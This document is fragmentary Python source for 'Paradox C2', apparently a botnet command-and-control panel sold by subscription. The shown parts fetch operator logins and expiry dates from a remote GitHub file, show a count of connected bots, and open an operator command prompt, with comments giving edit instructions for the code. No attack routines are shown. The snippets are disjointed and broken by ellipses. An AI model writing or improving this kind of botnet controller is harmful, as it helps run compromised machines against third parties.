...
bannerLogin = '''
            ( coded by MI Sixteen )
          ( Team BCS)
        Thank you for using Paradox  C2
'''
...
# Read credentials from GitHub login file
# --- replace this existing function with the new one ---
def find_login(client, username, password):
    """
    Fetches remote login file and validates credentials.
    Returns: (status: bool, info: str)
      - If status True => info is expiration string (YYYY-MM-DD)
      - If status False => info is reason string: "expired", "invalid", "fetch_error", etc.
    IMPORTANT: This function DOES NOT close the client socket. Caller handles socket lifecycle.
    """
    import requests

    try:
        r = requests.get("https://raw.githubusercontent.com/system32hacktool/Systemmodule/refs/heads/main/logins.txt", timeout=5)
        lines = r.text.splitlines()
    except Exception as e:
        # Could not fetch remote list
        print(f"[find_login] fetch error: {e}")
        return False, "fetch_error"

    for line in lines:
        # normalize and skip empty/comment lines
        if not line or line.strip() == "" or line.strip().startswith("#"):
            continue

        parts = line.strip().split(':')
        # Expect exactly 3 parts: username:password:YYYY-MM-DD
        if len(parts) != 3:
            # malformed line, skip it (optionally log)
            print(f"[find_login] skipping malformed line: {repr(line)}")
            continue

        c_username, c_password, data_Expiration_str = parts
        # match username (case-insensitive) and exact password
        if c_username.lower() == username.lower() and c_password == password:
            # try parse expiration date
            try:
                data_Expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d')
            except Exception as e:
                print(f"[find_login] invalid date format for user {c_username}: {data_Expiration_str} -> {e}")
                return False, "invalid_expiration"

            # check expiry
            if data_Expiration < datetime.now():
                return False, "expired:" + data_Expiration_str

            # success
            return True, data_Expiration_str

    # no match
    return False, "invalid_credentials"


# --- Replace this login-check block inside handle_client() where you call find_login() ---
# After you have read `username` and `password` from the client:

ok, info = find_login(client, username, password)
if not ok:
    # inform client with a friendly, non-verbose message
    if info == "fetch_error":
        send(client, f'{gray}Server error fetching login data. Try again later.')
    elif info.startswith("expired"):
        # info can be "expired:YYYY-MM-DD"
        exp = info.split(":", 1)[1] if ":" in info else "unknown"
        send(client, f'{gray}Your account expired on {exp}.')
    elif info == "invalid_expiration":
        send(client, f'{gray}Account data malformed. Contact admin.')
    else:
        send(client, f'{gray}Invalid credentials.')
    time.sleep(1)
    try:
        client.close()
    except:
...
# success path: set user_name, start threads, etc.
global user_name
user_name = username
threading.Thread(target=update_title, args=(client, username, info), daemon=True).start()
threading.Thread(target=command_line, args=(client, username), daemon=True).start()
...
def captcha(send, client, grey):
    ...
    try:
        ...
        send(client, f'{grey}Invalid input, closing connection.')
        client.close()
        return
    time.sleep(0.4)
...
def handle_client(client, address):
    ...
    try:
        client.send(b'')  # try sending empty bytes to check connection
    except OSError:
        client.close()
        return
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0; Paradox C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}Paradox{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
